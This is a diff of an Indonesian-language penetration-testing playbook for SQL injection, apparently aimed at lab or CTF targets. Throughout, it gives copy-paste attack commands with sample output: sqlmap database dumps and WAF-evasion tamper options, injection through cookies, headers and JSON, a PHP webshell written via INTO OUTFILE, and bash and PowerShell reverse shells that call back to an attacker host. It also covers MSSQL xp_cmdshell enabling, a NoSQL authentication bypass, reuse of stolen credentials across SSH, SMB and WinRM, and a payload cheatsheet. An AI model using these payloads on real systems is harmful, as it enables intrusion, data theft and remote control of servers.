+## FASE 6: RCE DARI SQLi (MySQL)
 
-```
-# Sequence lengkap setelah SQLi confirmed
-DB_NAME_FOUND="shopdb"   # Ganti sesuai output
+## ═══════════════════════════════════
 
-# 1. List semua database
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch --dbs
+### Pre-check Privilege
 
-# 2. List tabel di database target
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch -D $DB_NAME_FOUND --tables
-
-# 3. List kolom di tabel users
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
-    -D $DB_NAME_FOUND -T users --columns
-
-# 4. Dump data
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
-    -D $DB_NAME_FOUND -T users \
-    -C username,password \
-    --dump
-
-# 5. Dump semua data (hati-hati: bisa lambat)
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" --batch \
-    -D $DB_NAME_FOUND --dump-all
-```
-
----
-
-### Langkah 6.3 — SQLMap dengan WAF Bypass
-
-Bash
-
-```
-# Jika dapat 403 atau WAF detected:
-wafw00f $TARGET_URL
-
-# Coba tamper scripts sesuai WAF:
-# Space filter → space2comment
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --tamper=space2comment \
-    --batch --dbs
-
-# Random case
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --tamper=randomcase \
-    --batch --dbs
-
-# Kombinasi (urutan penting!)
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --tamper=space2comment,randomcase \
-    --batch --dbs
-
-# Level dan risk yang lebih tinggi (lebih agresif, lebih lambat)
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --level=3 --risk=2 \
-    --batch --dbs
-```
-
-**OUTPUT BERHASIL ✅ — SQLMap detect:**
-
-text
-
-```
-[INFO] GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Type: time-based blind
-    Type: UNION query
----
-back-end DBMS: MySQL >= 5.0.12
-```
-
-**OUTPUT GAGAL ❌ — "all tested parameters do not appear to be injectable":**
-
-text
-
-```
-[WARNING] GET parameter 'id' does not seem to be injectable
-[CRITICAL] all tested parameters do not appear to be injectable.
-```
-
-➡️ Tapi tadi manual injection berhasil! Kemungkinan:
-
-1. Parameter salah → cek nama parameter
-2. Butuh cookie → tambahkan `--cookie`
-3. WAF blocking SQLMap → coba `--tamper`, `--random-agent`, `--tor`
-4. Injeksi ada di header → tambahkan `--headers`
-
-Bash
-
-```
-# Coba dengan random user agent
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --random-agent \
-    --batch --dbs
-
-# Tambahkan delay antara request (stealth)
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --delay=1 --random-agent \
-    --batch --dbs
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 7: SPECIAL CONTEXTS
-
-## ═══════════════════════════════════════
-
-### Langkah 7.1 — SQLi dalam Cookie
-
-Bash
-
-```
-# Test cookie injection
-curl -i "$TARGET_URL/profile" -H "Cookie: user=admin'"
-curl -i "$TARGET_URL/profile" -H "Cookie: user=admin' AND 1=1-- -"
-curl -i "$TARGET_URL/profile" -H "Cookie: user=admin' AND 1=2-- -"
-
-# SQLMap dengan cookie injection
-sqlmap -u "$TARGET_URL/profile" \
-    --cookie="user=test" \
-    -p user \
-    --batch --dbs
-```
-
-**OUTPUT BERHASIL ✅ — Ukuran response berbeda:**
-
-text
-
-```
-HTTP/1.1 200 OK
-Content-Length: 14820     ← AND 1=1 (TRUE)
-
-HTTP/1.1 200 OK  
-Content-Length: 421       ← AND 1=2 (FALSE)
-```
-
-➡️ Cookie field `user` vulnerable! Lanjutkan extraction seperti biasa.
-
----
-
-### Langkah 7.2 — SQLi dalam HTTP Header
-
-Bash
-
-```
-# User-Agent injection (sering terjadi di logging)
-curl -i "$TARGET_URL/" -H "User-Agent: test'"
-curl -i "$TARGET_URL/" -H "User-Agent: test' AND 1=1-- -"
-
-# X-Forwarded-For injection (sering di IP tracking/whitelist)
-curl -i "$TARGET_URL/" -H "X-Forwarded-For: 10.0.0.1'"
-curl -i "$TARGET_URL/" -H "X-Forwarded-For: 10.0.0.1' AND 1=1-- -"
-
-# Referer injection
-curl -i "$TARGET_URL/product" -H "Referer: http://google.com/'"
-
-# SQLMap untuk header injection
-sqlmap -u "$TARGET_URL/" \
-    --headers="X-Forwarded-For: 10.0.0.1*" \
-    --batch --dbs
-```
-
----
-
-### Langkah 7.3 — SQLi dalam JSON Body (API)
-
-Bash
-
-```
-# Test dengan single quote di JSON value
-curl -s -X POST "$TARGET_URL/api/search" \
-    -H "Content-Type: application/json" \
-    -d '{"search":"test'"'"'"}' | head -20
-
-# Boolean test
-curl -s -X POST "$TARGET_URL/api/item" \
-    -H "Content-Type: application/json" \
-    -d '{"id":"10 AND 1=1-- -"}' | wc -c
-
-curl -s -X POST "$TARGET_URL/api/item" \
-    -H "Content-Type: application/json" \
-    -d '{"id":"10 AND 1=2-- -"}' | wc -c
-
-# SQLMap dengan JSON body
-# Cara terbaik: simpan request ke file
-cat > ~/sqli_loot/requests/api_request.txt << 'EOF'
-POST /api/search HTTP/1.1
-Host: 10.10.11.200
-Content-Type: application/json
-Content-Length: 20
-
-{"search":"test*"}
-EOF
-
-sqlmap -r ~/sqli_loot/requests/api_request.txt --batch --dbs
-```
-
-**OUTPUT BERHASIL ✅ — Size berbeda:**
-
-text
-
-```
-14820    ← AND 1=1 (TRUE)
-421      ← AND 1=2 (FALSE)
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 8: SQL INJECTION TO RCE
-
-## ═══════════════════════════════════════
-
-> **Prasyarat:** Sudah dapat DB user, DB version, dan tahu web root path
-
-### Langkah 8.1 — Cek Privilege File (MySQL)
-
-Bash
-
-```
-# Cek apakah user DB punya FILE privilege
+```bash
 curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT (SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(0x27,user(),0x27)),'B','C'-- -" \
-    "$TARGET_URL/item"
+  --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" \
+  "$TARGET_URL/item"
+```
 
-# Cek secure_file_priv setting
+- `''` → bisa tulis ke mana saja ✅
+- Path → restricted ⚠️
+- `NULL` → tidak bisa ❌
+
+```bash
+# Konfirmasi FILE read
 curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" \
-    "$TARGET_URL/item"
+  --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/passwd'),'B','C'-- -" \
+  "$TARGET_URL/item"
 ```
 
-**OUTPUT BERHASIL ✅ — Punya FILE privilege:**
+### Upload Webshell
 
-HTML
-
-```
-<div class="product-name">SELECT,INSERT,UPDATE,DELETE,FILE,...</div>
-```
-
-**OUTPUT secure_file_priv ✅ — Kosong (tidak dibatasi):**
-
-HTML
-
-```
-<div class="product-name"></div>    ← KOSONG = bisa tulis ke mana saja!
-```
-
-**OUTPUT secure_file_priv ❌ — Dibatasi:**
-
-HTML
-
-```
-<div class="product-name">/var/lib/mysql-files/</div>    ← Hanya bisa tulis ke sini
-```
-
----
-
-### Langkah 8.2 — Cari Web Root Path
-
-Bash
-
-```
-# Method 1: Baca file konfigurasi umum
+```bash
 curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),'B','C'-- -" \
-    "$TARGET_URL/item"
+  --data-urlencode "$PARAM=0 UNION SELECT '<?php system(\$_GET[\"c\"]); ?>','B','C' INTO OUTFILE '/var/www/html/sh.php'-- -" \
+  "$TARGET_URL/item"
 
-# Method 2: Baca file PHP yang sudah diketahui
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/var/www/html/index.php'),'B','C'-- -" \
-    "$TARGET_URL/item"
-
-# Method 3: Coba baca /etc/passwd untuk konfirmasi READ bekerja
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT LOAD_FILE('/etc/passwd'),'B','C'-- -" \
-    "$TARGET_URL/item"
+# Test
+curl -s "http://$TARGET/sh.php?c=id"
 ```
 
-**OUTPUT BERHASIL ✅ — Bisa baca /etc/passwd:**
-
-HTML
+**OUTPUT ✅:**
 
 ```
-<div class="product-name">root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-...
-</div>
+uid=33(www-data) gid=33(www-data)
 ```
 
-➡️ FILE read bekerja! Web root kemungkinan `/var/www/html/`
-
----
-
-### Langkah 8.3 — Upload Webshell
-
-Bash
-
-```
-# Upload PHP webshell sederhana
-curl -s --get \
-    --data-urlencode "$PARAM=0 UNION SELECT '<?php if(isset(\$_REQUEST[\"cmd\"])){echo \"<pre>\".shell_exec(\$_REQUEST[\"cmd\"]).\"</pre>\";}?>','B','C' INTO OUTFILE '/var/www/html/shell.php'-- -" \
-    "$TARGET_URL/item"
-
-# Verifikasi webshell terupload
-curl -s "http://$TARGET/shell.php"
-
-# Test eksekusi command
-curl -s "http://$TARGET/shell.php?cmd=id"
-curl -s "http://$TARGET/shell.php?cmd=whoami"
-curl -s "http://$TARGET/shell.php?cmd=cat+/etc/passwd"
-```
-
-**OUTPUT BERHASIL ✅ — Command execution:**
-
-HTML
-
-```
-<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
-```
-
-➡️ **RCE VIA SQLi!** Upgrade ke reverse shell:
-
-Bash
-
-```
-# Setup listener
+```bash
+# Reverse shell
 nc -lvnp $LPORT &
-
-# Trigger reverse shell
-REVSHELL="bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
-curl -s "http://$TARGET/shell.php?cmd=$REVSHELL"
-
-# Atau pakai URL encoding yang lebih bersih
-curl -s "http://$TARGET/shell.php" \
-    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
-```
-
-**OUTPUT BERHASIL ✅ — Reverse shell masuk:**
-
-text
-
-```
-connect to [10.10.14.5] from 10.10.11.200:54321
-www-data@web01:/var/www/html$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
-➡️ Dapat shell! Selanjutnya privilege escalation → ke **<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>**
-
-**OUTPUT GAGAL ❌ — INTO OUTFILE gagal:**
-
-HTML
-
-```
-<!-- Tidak ada output, atau error -->
-ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option
-```
-
-➡️ Coba path yang diizinkan atau gunakan SQLMap `--os-shell`:
-
-Bash
-
-```
-sqlmap -u "$TARGET_URL/item?$PARAM=$PARAM_VALUE" \
-    --os-shell \
-    --batch
+curl -s "http://$TARGET/sh.php" \
+  --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
 ```
 
 ---
 
-### Langkah 8.4 — MSSQL xp_cmdshell
-
-Bash
-
-```
-# Cek apakah xp_cmdshell tersedia
-curl -s --get \
-    --data-urlencode "$PARAM=1; EXEC xp_cmdshell 'whoami'-- -" \
-    "$TARGET_URL/item"
-
-# Jika disabled, coba enable (butuh sysadmin privilege)
-curl -s --get \
-    --data-urlencode "$PARAM=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -" \
-    "$TARGET_URL/item"
-
-# Setelah enable, jalankan command
-curl -s --get \
-    --data-urlencode "$PARAM=1; EXEC xp_cmdshell 'whoami'-- -" \
-    "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅:**
-
-text
-
-```
-nt service\mssqlserver
-```
-
-Bash
-
-```
-# Reverse shell via PowerShell (MSSQL/Windows)
-# Setup listener dulu
-nc -lvnp $LPORT &
-
-# Command untuk download dan jalankan PowerShell reverse shell
-PS_CMD='powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\"'"$LHOST"'\",'"$LPORT"');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$ss=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($ss,0,$ss.Length);$s.Flush()};$c.Close()"'
-
-curl -s --get \
-    --data-urlencode "$PARAM=1; EXEC xp_cmdshell '$PS_CMD'-- -" \
-    "$TARGET_URL/item"
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 9: NOSQL INJECTION (MongoDB)
-
-## ═══════════════════════════════════════
-
-> **Masuk sini jika:** Target menggunakan Node.js/MongoDB (bukan SQL database)
-
-### Langkah 9.1 — Deteksi NoSQL
-
-Bash
-
-```
-# Cek indikasi MongoDB di response/headers
-curl -s "$TARGET_URL" | grep -iE "(mongodb|mongoose|mongo)"
-curl -s -I "$TARGET_URL" | grep -iE "(express|node)"
-
-# Test login bypass dengan $ne operator
-curl -s -X POST "$TARGET_URL/login" \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":{"$ne":"invalid"}}' | head -20
-
-# Bandingkan dengan request normal
-curl -s -X POST "$TARGET_URL/login" \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":"wrong"}' | head -20
-```
-
-**OUTPUT BERHASIL ✅ — Login bypass dengan $ne:**
-
-JSON
-
-```
-{"success":true,"token":"eyJ0eXAi...","redirect":"/dashboard"}
-```
-
-➡️ **NoSQL Injection berhasil!** Kita bypass autentikasi.
-
-**OUTPUT dengan password salah:**
-
-JSON
-
-```
-{"success":false,"message":"Invalid credentials"}
-```
-
-Bash
-
-```
-# Setelah bypass: gunakan token untuk akses admin
-TOKEN="eyJ0eXAi..."
-curl -s "$TARGET_URL/api/users" \
-    -H "Authorization: Bearer $TOKEN"
-
-# Atau coba $regex untuk enumerate username
-curl -s -X POST "$TARGET_URL/login" \
-    -H "Content-Type: application/json" \
-    -d '{"username":{"$regex":"^admin"},"password":{"$ne":"x"}}'
-```
-
----
-
-## ═══════════════════════════════════════
-
-## FASE 10: WAF BYPASS
-
-## ═══════════════════════════════════════
-
-### Langkah 10.1 — Deteksi dan Identifikasi WAF
-
-Bash
-
-```
-# Deteksi WAF
-wafw00f $TARGET_URL
-
-# Manual detection dari response header
-curl -s -I "$TARGET_URL/item?id=10'" | grep -iE "(server|x-|via|cf-|sucuri)"
-
-# Cek response code saat inject
-curl -s -o /dev/null -w "%{http_code}" --get --data-urlencode "id=10'" "$TARGET_URL/item"
-```
-
-**OUTPUT BERHASIL ✅ — WAF terdeteksi:**
-
-text
-
-```
-[+] The site is behind Cloudflare (Cloudflare)
-```
-
-atau:
-
-text
-
-```
-HTTP: 403    ← WAF block
-HTTP: 406    ← WAF block
-HTTP: 429    ← Rate limit
-```
-
----
-
-### Langkah 10.2 — Bypass Techniques
-
-Bash
-
-```
-# Technique 1: Case variation
-curl -s --get --data-urlencode "id=10 UnIoN SeLeCt 1,2,3-- -" "$TARGET_URL/item" | wc -c
-
-# Technique 2: Comment injection (MySQL)
-curl -s --get --data-urlencode "id=10 /*!UNION*/ /*!SELECT*/ 1,2,3-- -" "$TARGET_URL/item" | wc -c
-
-# Technique 3: Whitespace alternatives
-curl -s --get --data-urlencode "id=10/**/UNION/**/SELECT/**/1,2,3-- -" "$TARGET_URL/item" | wc -c
-
-# Technique 4: URL encoding ganda
-# ' → %27 → %2527 (double encode)
-curl -s "$TARGET_URL/item?id=10%2527" | wc -c
-
-# Technique 5: Hex encoding string
-# 'users' → 0x7573657273
-curl -s --get \
-    --data-urlencode "id=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=0x73686f7064622d- -" \
-    "$TARGET_URL/item"
-
-# SQLMap dengan berbagai tamper
-sqlmap -u "$TARGET_URL/item?id=10" \
-    --tamper=space2comment,randomcase,charencode \
-    --random-agent \
-    --delay=2 \
-    --batch --dbs
-```
-
----
-
-## ═══════════════════════════════════════
-
-## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA
-
-## ═══════════════════════════════════════
-
-|Error/Situasi|Penyebab|Solusi|
-|---|---|---|
-|Single quote tidak trigger error|Error disembunyikan / tidak ada SQLi|Coba boolean blind test|
-|UNION error "column mismatch"|Jumlah kolom salah|Ulangi ORDER BY dari 1|
-|UNION berhasil tapi data tidak muncul|ID yang ada override inject|Gunakan id=0 atau id=99999|
-|GROUP_CONCAT terpotong|Batas panjang default 1024|Tambah `GROUP_CONCAT(... ORDER BY 1 SEPARATOR ',')` atau pakai LIMIT|
-|SQLMap tidak detect|Parameter tidak injectable / perlu cookie|Verifikasi manual dulu, tambahkan `--cookie`|
-|`AND 1=1` dan `AND 1=2` sama ukurannya|Aplikasi tidak pakai kondisi itu|Coba: `AND '1'='1` (string context) atau time-based|
-|SLEEP tidak delay|Wrong DB, syntax salah|Test semua sleep function per DB|
-|INTO OUTFILE gagal|`secure_file_priv` atau permission|Cek setting, coba path lain, atau gunakan `--os-shell`|
-|403 di semua payload|WAF blocking|Gunakan tamper scripts, encoding, atau manual bypass|
-|Payload dipotong/disanitize|Input filtering|Coba encoding berbeda, hex, atau bypass karakter|
-|Time-based tidak reliable|Network latency tinggi|Naikkan delay ke 10 detik, test di waktu berbeda|
-|Google search hint|`site:hacktricks.xyz sql injection [DB_TYPE]`|Spesifik cari per database type|
-|Stuck di boolean blind|Terlalu lambat manual|Gunakan script python atau SQLMap `--technique=B`|
-|Response selalu sama|Aplikasi cached / parameter tidak dipakai|Test parameter lain, test dengan Burp|
-
----
-
-## ═══════════════════════════════════════
-
-## CROSS-SERVICE: SETELAH DAPAT CREDENTIAL
-
-## ═══════════════════════════════════════
-
-Bash
-
-```
-# Setiap kali dapat username:password dari SQLi, test ke service lain!
-
-export USER="admin"
-export PASS="password123"
-
-# Web Login
-curl -s -X POST "$TARGET_URL/login" \
-    -d "username=$USER&password=$PASS" -L | grep -iE "(dashboard|welcome|logout)"
-
-# SSH
-nxc ssh $TARGET -u "$USER" -p "$PASS"
-ssh "$USER@$TARGET"               # → ke <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
-
-# FTP
-nxc ftp $TARGET -u "$USER" -p "$PASS"  # → ke <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
-
-# SMB
-nxc smb $TARGET -u "$USER" -p "$PASS"  # → ke <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
-
-# Database direct access
-mysql -h $TARGET -u "$USER" -p"$PASS"  # → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
-
-# WinRM (Windows)
-nxc winrm $TARGET -u "$USER" -p "$PASS"
-evil-winrm -i $TARGET -u "$USER" -p "$PASS"
-```
-
-**Diagram Cross-Service:**
-
-text
-
-```
-SQLi Credentials Found
-          │
-          ├──→ Web Admin Panel   → Upload webshell / template injection
-          ├──→ Port 22  (SSH)    → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
-          ├──→ Port 21  (FTP)    → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
-          ├──→ Port 445 (SMB)    → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
-          ├──→ Port 3306 (MySQL) → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
-          ├──→ Port 5985 (WinRM) → evil-winrm
-          └──→ Hash cracking     → <a href="/docs/password-cracking" class="text-[#00b4d8] hover:underline font-mono font-semibold">63_password_cracking_workflow.md</a>
-```
-
----
-
-## ═══════════════════════════════════════
+## ═══════════════════════════════════
 
 ## MASTER DECISION TREE
 
-## ═══════════════════════════════════════
-
-text
+## ═══════════════════════════════════
 
 ```
 START: Ditemukan Input Parameter (GET/POST/Cookie/Header)
 │
-├─ FASE 0: Reconnaissance
-│   └─ Identifikasi parameter, ambil baseline
+├─ FASE 0: Reconnaissance → baseline, tech stack
 │
 ├─ FASE 1: Detection
-│   ├─ [SQL Error terlihat]      → FASE 3 (Error-Based) ATAU FASE 2 (UNION)
-│   ├─ [TRUE/FALSE berbeda]      → FASE 4 (Boolean Blind)
-│   ├─ [Delay terdeteksi]        → FASE 5 (Time-Based)
-│   └─ [Tidak ada perbedaan]     → Coba context lain / parameter lain
+│   ├─ SQL Error terlihat → FASE 3 (Error-Based) ATAU FASE 2 (UNION)
+│   ├─ TRUE/FALSE berbeda → FASE 4 (Boolean Blind)
+│   ├─ Delay terdeteksi → FASE 5 (Time-Based)
+│   └─ Login form ditemukan → Section 2 (Login Bypass)
 │
 ├─ FASE 2: UNION SQLi
-│   ├─ ORDER BY → temukan jumlah kolom
-│   ├─ UNION SELECT NULL → konfirmasi
-│   ├─ Find displayable columns
-│   └─ Extract: DB → Tables → Columns → Data → CRACK HASH
+│   └─ Column count → displayable col → DB → Tables → Columns → Data → CRACK
 │
 ├─ FASE 3: Error-Based
 │   └─ MySQL: EXTRACTVALUE | MSSQL: CONVERT | PgSQL: CAST
 │
 ├─ FASE 4: Boolean Blind
-│   ├─ Manual: ASCII + SUBSTRING + Binary search
-│   └─ Auto: Python script atau SQLMap --technique=B
+│   ├─ Manual: SUBSTRING + ASCII + binary search
+│   └─ Auto: Python script / SQLMap --technique=B
 │
 ├─ FASE 5: Time-Based
-│   ├─ MySQL: SLEEP() | MSSQL: WAITFOR | PgSQL: pg_sleep()
+│   ├─ MySQL: SLEEP() | MSSQL: WAITFOR | PgSQL: pg_sleep() subquery
 │   └─ SQLMap --technique=T (lebih reliable)
 │
-├─ FASE 6: SQLMap Automation
-│   └─ Setelah manual confirm → sqlmap untuk dump efisien
+├─ FASE 6: SQLMap Automation (setelah manual confirm)
 │
-├─ FASE 7: Special Contexts
-│   └─ Cookie / Header / JSON / XML injection
+├─ FASE 7: Special Contexts (Cookie/Header/JSON/XML)
 │
 └─ FASE 8: Escalation
     ├─ [MySQL FILE priv] → INTO OUTFILE → Webshell → RCE → Privesc
     ├─ [MSSQL sysadmin] → xp_cmdshell → RCE → Privesc
     ├─ [PgSQL superuser] → COPY PROGRAM → RCE → Privesc
-    └─ [Credentials]    → Credential reuse ke service lain
+    └─ [Credentials] → Credential state machine → Cross-service pivot
 ```
 
 ---
 
-## ⚡ CHEATSHEET — COPY PASTE READY
-
-Bash
+# ⚡ Quick Reference Cheatsheet
 
 ```
-# === SETUP ===
-export TARGET="10.10.11.200"
-export LHOST="10.10.14.5"
-export PARAM="id"
-export TARGET_URL="http://$TARGET"
-mkdir -p ~/sqli_loot/{dumps,hashes,shells,requests}
+=== DETECTION (Burp Repeater) ===
+Single quote:  id=10'
+Boolean TRUE:  id=10 AND 1=1-- -
+Boolean FALSE: id=10 AND 1=2-- -
+String TRUE:   id=Gifts' AND '1'='1-- -
+Time [MySQL]:  id=10 AND SLEEP(10)-- -
+Time [PgSQL]:  id=10 AND 1=(SELECT 1 FROM pg_sleep(10))-- -
+Time [MSSQL]:  id=10; WAITFOR DELAY '0:0:10'-- -
+Login bypass:  username=administrator'--
 
-# === DETECTION ===
-curl -s --get --data-urlencode "$PARAM=10'" "$TARGET_URL/item"          # Single quote
-curl -s --get --data-urlencode "$PARAM=10 AND 1=1-- -" "$TARGET_URL/item" | wc -c  # TRUE
-curl -s --get --data-urlencode "$PARAM=10 AND 1=2-- -" "$TARGET_URL/item" | wc -c  # FALSE
-time curl -s -o /dev/null --get --data-urlencode "$PARAM=10 AND SLEEP(5)-- -" "$TARGET_URL/item"  # Time
+=== COLUMN COUNT ===
+ORDER BY:  id=10 ORDER BY 1--     (naik sampai error)
+NULL:      id=10 UNION SELECT NULL--  (naik NULL sampai 200)
+Oracle:    id=10 UNION SELECT NULL FROM DUAL--
 
-# === UNION FLOW (MySQL, 3 columns) ===
-curl -s --get --data-urlencode "$PARAM=10 ORDER BY 4-- -" "$TARGET_URL/item" | wc -c           # Column count
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT 'A','B','C'-- -" "$TARGET_URL/item"      # Displayable cols
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT @@version,database(),user()-- -" "$TARGET_URL/item"  # DB info
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(table_name),'B','C' FROM information_schema.tables WHERE table_schema=database()-- -" "$TARGET_URL/item"  # Tables
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(column_name),'B','C' FROM information_schema.columns WHERE table_name='users'-- -" "$TARGET_URL/item"     # Columns
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT GROUP_CONCAT(username,0x3a,password),'B','C' FROM users-- -" "$TARGET_URL/item"  # Dump!
+=== FIND DISPLAYABLE COL (3 kolom) ===
+id=10 UNION SELECT 'A',NULL,NULL--
+id=10 UNION SELECT NULL,'B',NULL--
+id=10 UNION SELECT NULL,NULL,'C'--
 
-# === SQLMAP ===
-sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch                          # Detect
-sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch --dbs                    # List DBs
-sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch -D shopdb --tables       # List Tables
-sqlmap -u "$TARGET_URL/item?$PARAM=10" -p $PARAM --batch -D shopdb -T users --dump # Dump!
-sqlmap -r request.txt --batch --dbs                                                # Dari file request
+=== DB INFO ===
+[MySQL]   UNION SELECT @@version,database(),user()-- -
+[PgSQL]   UNION SELECT version(),current_database(),current_user--
+[MSSQL]   UNION SELECT @@VERSION,DB_NAME(),SYSTEM_USER--
+[Oracle]  UNION SELECT banner,NULL FROM v$version--
+[SQLite]  UNION SELECT sqlite_version(),NULL--
 
-# === HASH CRACKING ===
-hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --force         # MD5
-hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt --force       # SHA1
-hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force      # bcrypt
+=== TABLES ===
+[MySQL]   UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -
+[PgSQL]   UNION SELECT string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'--
+[MSSQL]   UNION SELECT STRING_AGG(name,','),NULL FROM sys.tables--
+[Oracle]  UNION SELECT table_name,NULL FROM all_tables--
+[SQLite]  UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--
 
-# === RCE (MySQL) ===
-# Cek FILE priv:
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT @@secure_file_priv,'B','C'-- -" "$TARGET_URL/item"
-# Upload shell:
-curl -s --get --data-urlencode "$PARAM=0 UNION SELECT '<?php system(\$_GET[\"c\"]); ?>','B','C' INTO OUTFILE '/var/www/html/sh.php'-- -" "$TARGET_URL/item"
-# Execute:
-curl -s "http://$TARGET/sh.php?c=id"
+=== COLUMNS ===
+[MySQL]   UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -
+[PgSQL]   UNION SELECT string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'--
+[MSSQL]   UNION SELECT STRING_AGG(c.name,','),NULL FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id WHERE t.name='users'--
+[Oracle]  UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
+[SQLite]  UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--
+
+=== DUMP ===
+2 col:    UNION SELECT username,password FROM users--
+1 col:    UNION SELECT username||'~'||password FROM users--
+[MySQL]:  UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL FROM users-- -
+[SQLite]: UNION SELECT group_concat(username||':'||password),NULL FROM users--
+
+=== ERROR-BASED ===
+[PgSQL]:  ' AND CAST((SELECT password FROM users WHERE username='administrator') AS integer)--
+[MySQL]:  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))-- -
+[MSSQL]:  ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--
+
+=== BOOLEAN BLIND ===
+Cek user:   ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+Panjang:    ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
+Char:       ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+=== TIME-BASED ===
+[MySQL]    ' AND SLEEP(10)-- -
+[PgSQL]    ' AND 1=(SELECT 1 FROM pg_sleep(10))--
+[MSSQL]    '; WAITFOR DELAY '0:0:10'--
+[Oracle]   '||dbms_pipe.receive_message('a',10)--
+
+=== BOOLEAN CONDITIONAL ===
+[MySQL]:   ' AND IF(1=1,SLEEP(10),0)-- -
